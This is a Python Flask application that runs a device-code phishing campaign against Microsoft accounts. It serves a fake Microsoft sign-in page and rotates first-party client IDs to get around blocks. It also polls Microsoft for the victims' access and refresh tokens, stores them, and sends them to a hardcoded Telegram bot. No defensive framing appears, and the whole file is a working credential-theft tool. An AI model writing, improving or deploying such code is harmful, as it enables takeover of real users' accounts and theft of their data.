import os
import sys
import time
import uuid
import json
import sqlite3
import requests
import threading
import signal
from flask import Flask, request, redirect, url_for, render_template_string, session, g

# ================= CONFIGURATION =================
# Telegram Config
TG_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
TG_CHAT_ID = "8877118461"

# Microsoft OAuth Config
TENANT = "common"
SCOPE = "https://graph.microsoft.com/.default offline_access"
REDIRECT_URI = "http://localhost" # Not used in device flow, but required for some params

# Client IDs to rotate (Microsoft First-Party Public Clients)
CLIENT_IDS = [
    "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure PowerShell
    "1950a258-227b-4e31-a9cf-717495945fc2",  # Azure CLI
    "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Microsoft Office
    "ab9b8c07-8f02-4f72-87fa-80105867a763",  # OneDrive iOS
    "b26aadf8-566f-4478-926f-589f601d9c74",  # OneDrive
    "27922004-16b8-4a39-9745-afe3546f733d",  # Office
    "27922004-5251-4030-b22d-91ecd9a37ea4",  # Office Alt
]

# Database Path (Render ephemeral storage)
DB_PATH = "/tmp/phish.db"

# ================= APP INIT =================
app = Flask(__name__)
app.secret_key = os.urandom(24)

# ================= DATABASE HELPERS =================
def get_db():
    if 'db' not in g:
        g.db = sqlite3.connect(DB_PATH)
        g.db.row_factory = sqlite3.Row
        # Enable WAL mode for better concurrency with Gunicorn threads
        g.db.execute("PRAGMA journal_mode=WAL;")
    return g.db

@app.teardown_appcontext
def close_db(exception):
    db = g.pop('db', None)
    if db is not None:
        db.close()

def init_db():
    """Initialize the SQLite database schema."""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS sessions (
        id TEXT PRIMARY KEY,
        user_code TEXT UNIQUE,
        device_code TEXT,
        client_id TEXT,
        interval INTEGER,
        expires_at REAL,
        status TEXT DEFAULT 'pending', -- pending, completed, failed
        access_token TEXT,
        refresh_token TEXT,
        id_token TEXT,
        email TEXT,
        cookies TEXT,
        created_at REAL DEFAULT (strftime('%s', 'now'))
    )''')
    conn.commit()
    conn.close()

# Initialize DB on import (for Gunicorn)
init_db()

# ================= TELEGRAM HELPER =================
def send_telegram(message, file_path=None):
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
    try:
        if file_path:
            # Send document first if exists
            doc_url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendDocument"
            with open(file_path, 'rb') as f:
                requests.post(doc_url, data={"chat_id": TG_CHAT_ID}, files={"document": f})
        
        requests.post(url, data={
            "chat_id": TG_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }, timeout=10)
    except Exception as e:
        print(f"[TG ERROR] {e}", flush=True)

# ================= MICROSOFT API HELPERS =================
def get_device_code(client_id):
    """Request a device code from Microsoft using a specific Client ID."""
    url = f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/devicecode"
    payload = {
        "client_id": client_id,
        "scope": SCOPE
    }
    try:
        resp = requests.post(url, data=payload, timeout=10)
        if resp.status_code == 200:
            return resp.json(), None
        else:
            return None, resp.json()
    except Exception as e:
        return None, str(e)

def poll_token(device_code, client_id, interval):
    """Poll for the token after user authentication."""
    url = f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/token"
    payload = {
        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
        "device_code": device_code,
        "client_id": client_id
    }
    
    start_time = time.time()
    # Device codes typically expire in 15 mins (900s), we poll for 10 mins to be safe
    while time.time() - start_time < 600: 
        try:
            resp = requests.post(url, data=payload, timeout=10)
            data = resp.json()
            
            if resp.status_code == 200:
                return data, None # Success
            
            error = data.get("error", "")
            if error == "authorization_pending":
                time.sleep(interval)
                continue
            elif error == "slow_down":
                interval += 5
                time.sleep(interval)
                continue
            elif error in ["expired_token", "bad_verification_code"]:
                return None, "expired"
            else:
                # Other errors (invalid_grant, etc)
                return None, data.get("error_description", "unknown_error")
                
        except Exception as e:
            return None, str(e)
            
    return None, "timeout"

def extract_email_from_id_token(id_token):
    """Extract email from JWT ID Token without external libraries."""
    try:
        parts = id_token.split('.')
        if len(parts) != 3:
            return None
        # Decode payload (base64url)
        import base64
        payload = parts[1]
        # Add padding if necessary
        padding = 4 - len(payload) % 4
        if padding != 4:
            payload += "=" * padding
        decoded = base64.urlsafe_b64decode(payload)
        json_data = json.loads(decoded)
        return json_data.get("preferred_username") or json_data.get("upn") or json_data.get("email")
    except:
        return None

# ================= ROUTES =================

# HTML Template for the Phishing Page
LOGIN_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <style>
        body {
            font-family: "Segoe UI", "Helvetica Neue", Helvetica, Arial, sans-serif;
            background-color: #f3f3f3;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: white;
            width: 440px;
            padding: 44px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
            position: relative;
        }
        .logo {
            margin-bottom: 24px;
        }
        .logo img {
            height: 24px;
        }
        h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 10px;
            color: #1b1b1b;
        }
        p {
            font-size: 15px;
            margin-bottom: 20px;
            color: #1b1b1b;
        }
        .code-box {
            background: #f3f3f3;
            border: 1px solid #ccc;
            padding: 10px;
            font-size: 24px;
            letter-spacing: 2px;
            text-align: center;
            margin-bottom: 20px;
            font-weight: 600;
            color: #1b1b1b;
            cursor: pointer;
            user-select: all;
        }
        .btn {
            background-color: #0067b8;
            color: white;
            border: none;
            padding: 10px 24px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
        }
        .btn:hover {
            background-color: #005da6;
        }
        .footer {
            margin-top: 24px;
            font-size: 12px;
            color: #666;
        }
        .error {
            color: #d13438;
            font-size: 14px;
            margin-bottom: 10px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_5b393046.svg" alt="Microsoft">
        </div>
        <h1>Sign in</h1>
        <p>Enter the code shown below to sign in.</p>
        
        <div class="error" id="error-msg"></div>

        <div class="code-box" id="code-display">{{ user_code }}</div>
        
        <button class="btn" id="copy-btn" onclick="handleCopy()">Next</button>
        
        <div class="footer">
            <a href="#" style="color:#0067b8; text-decoration:none;">Can't access your account?</a>
        </div>
    </div>

    <script>
        function handleCopy() {
            const code = document.getElementById('code-display').innerText;
            navigator.clipboard.writeText(code).then(() => {
                // Visual feedback
                const btn = document.getElementById('copy-btn');
                btn.innerText = "Copied! Redirecting...";
                btn.style.backgroundColor = "#107c10";
                
                // Redirect to real Microsoft login after short delay
                setTimeout(() => {
                    window.location.href = "https://www.microsoft.com/devicelogin";
                }, 1500);
            }).catch(err => {
                console.error('Failed to copy: ', err);
                // Fallback redirect even if copy fails
                window.location.href = "https://www.microsoft.com/devicelogin";
            });
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    """Generate a new device code and serve the phishing page."""
    # Try each client ID until one works
    session_data = None
    used_client_id = None
    
    for cid in CLIENT_IDS:
        data, error = get_device_code(cid)
        if data:
            session_data = data
            used_client_id = cid
            break
    
    if not session_data:
        return "<h1>Service Unavailable</h1><p>Please try again later.</p>", 503

    user_code = session_data['user_code']
    device_code = session_data['device_code']
    interval = session_data.get('interval', 5)
    expires_in = session_data.get('expires_in', 900)
    
    # Store in SQLite
    db = get_db()
    session_id = str(uuid.uuid4())
    db.execute(
        "INSERT INTO sessions (id, user_code, device_code, client_id, interval, expires_at) VALUES (?, ?, ?, ?, ?, ?)",
        (session_id, user_code, device_code, used_client_id, interval, time.time() + expires_in)
    )
    db.commit()
    
    # Set cookie for tracking
    resp = render_template_string(LOGIN_HTML, user_code=user_code)
    response = app.make_response(resp)
    response.set_cookie('session_id', session_id)
    return response

@app.route('/status')
def status():
    """Endpoint for the frontend to check if login is complete (optional AJAX)."""
    session_id = request.cookies.get('session_id')
    if not session_id:
        return jsonify({"status": "unknown"})
    
    db = get_db()
    row = db.execute("SELECT status FROM sessions WHERE id=?", (session_id,)).fetchone()
    if row:
        return jsonify({"status": row['status']})
    return jsonify({"status": "unknown"})

# ================= BACKGROUND WORKER =================
def worker_loop():
    """Background thread to poll for tokens."""
    print("[WORKER] Started polling loop...", flush=True)
    
    while True:
        try:
            db = sqlite3.connect(DB_PATH)
            db.row_factory = sqlite3.Row
            
            # Get pending sessions that haven't expired
            now = time.time()
            rows = db.execute(
                "SELECT * FROM sessions WHERE status='pending' AND expires_at > ?", 
                (now,)
            ).fetchall()
            
            for row in rows:
                session_id = row['id']
                device_code = row['device_code']
                client_id = row['client_id']
                interval = row['interval']
                
                # Poll Microsoft
                token_data, error = poll_token(device_code, client_id, interval)
                
                if token_data:
                    # SUCCESS!
                    access_token = token_data.get('access_token')
                    refresh_token = token_data.get('refresh_token')
                    id_token = token_data.get('id_token')
                    
                    # Extract Email
                    email = extract_email_from_id_token(id_token) if id_token else "Unknown"
                    
                    # Update DB
                    db.execute(
                        "UPDATE sessions SET status='completed', access_token=?, refresh_token=?, id_token=?, email=? WHERE id=?",
                        (access_token, refresh_token, id_token, email, session_id)
                    )
                    db.commit()
                    
                    # Send Telegram Notification
                    msg = (
                        f"<b>🎯 NEW CATCH!</b>\n"
                        f"<b>Email:</b> <code>{email}</code>\n"
                        f"<b>Client ID Used:</b> <code>{client_id}</code>\n"
                        f"<b>Access Token:</b>\n<code>{access_token[:50]}...</code>\n"
                        f"<b>Refresh Token:</b>\n<code>{refresh_token[:50]}...</code>\n"
                        f"<b>ID Token:</b>\n<code>{id_token[:50]}...</code>"
                    )
                    send_telegram(msg)
                    print(f"[SUCCESS] {email} via {client_id}", flush=True)
                    
                elif error == "expired":
                    db.execute("UPDATE sessions SET status='expired' WHERE id=?", (session_id,))
                    db.commit()
                elif error == "timeout":
                     # Keep polling until expires_at handles it, but log if stuck
                     pass
                else:
                    # Check if Client ID is blocked (invalid_client, unauthorized_client)
                    if "invalid_client" in str(error) or "unauthorized_client" in str(error):
                        print(f"[BLOCKED] Client ID {client_id} is blocked. Rotating...", flush=True)
                        # Mark session to retry with new ID? 
                        # For simplicity in this version, we just let it fail or 
                        # you could implement re-issuing here. 
                        # Given the rotation in index(), new users get fresh IDs.
                        # Existing pending sessions with bad IDs will eventually expire.
                        
                    # Log other errors silently to avoid spam
                    
            db.close()
            time.sleep(5) # Poll DB every 5 seconds
            
        except Exception as e:
            print(f"[WORKER ERROR] {e}", flush=True)
            time.sleep(10)

# Start Worker Thread
worker_thread = threading.Thread(target=worker_loop, daemon=True)
worker_thread.start()

# ================= GRACEFUL SHUTDOWN =================
def handle_signal(sig, frame):
    print("[SHUTDOWN] Received signal, closing DB...", flush=True)
    # Close any open DB connections if needed
    sys.exit(0)

signal.signal(signal.SIGTERM, handle_signal)
signal.signal(signal.SIGINT, handle_signal)

if __name__ == '__main__':
    # For local testing only. Use Gunicorn for production.
    app.run(debug=True, host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
